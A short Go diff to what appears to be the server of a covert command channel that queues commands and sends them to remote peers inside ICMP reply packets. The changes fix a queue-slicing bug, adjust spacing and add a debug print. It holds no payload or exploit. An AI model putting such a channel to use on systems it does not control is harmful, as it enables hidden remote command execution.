@@ -20,7 +20,7 @@ func serveCommands(cmdCh chan string, outCh chan string) {
 			case p := <-ch:
 				cmds = handlePacket(p, cmds, outCh)
 				break
-			case cmd := <- cmdCh:
+			case cmd := <-cmdCh:
 				cmds = append(cmds, cmd)
 				break
 			}
@@ -34,7 +34,7 @@ func handlePacket(p *transport.Packet, cmds []string, outCh chan string) []strin
 		// reply with next command, if any
 		if len(cmds) > 0 {
 			go transport.Send(*p.From, []byte(cmds[0]), transport.IcmpCodeCommandReply)
-			cmds = cmds[:1]
+			cmds = cmds[1:]
 		} else {
 			go transport.Send(*p.From, []byte(""), transport.IcmpCodeCommandReply)
 		}
@@ -47,6 +47,7 @@ func handlePacket(p *transport.Packet, cmds []string, outCh chan string) []strin
 		break
 	}
 
+	fmt.Println(cmds)
 	return cmds
 }
 
